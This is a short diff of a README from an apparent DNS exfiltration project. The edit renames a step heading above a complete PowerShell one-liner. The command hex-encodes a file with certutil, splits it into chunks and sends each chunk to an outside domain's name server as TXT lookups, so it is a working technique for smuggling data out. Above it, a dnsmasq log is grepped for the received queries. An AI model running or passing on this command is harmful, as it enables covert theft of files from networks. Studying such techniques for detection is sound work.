@@ -79,7 +79,7 @@ sudo cat /var/log/dnsmasq.log | grep -F "[TXT]"
 ![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/ff2684c5-136f-4ab2-8da7-88c17f0aa1a2)
 
 
-## Step 11: Powershell command to hex encode a file, split, and do nslookup IMPROVEMENT POINT TO REMOVE encoded.hex
+## Step 11: Powershell command to hex encode a file, split, and do nslookup
 
 `certutil -encodehex ToExfil.txt encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; foreach ($line in $split) {nslookup -q=TXT "$Line.bhealthen.com" ns1.bhealthen.com; sleep 5} `
 
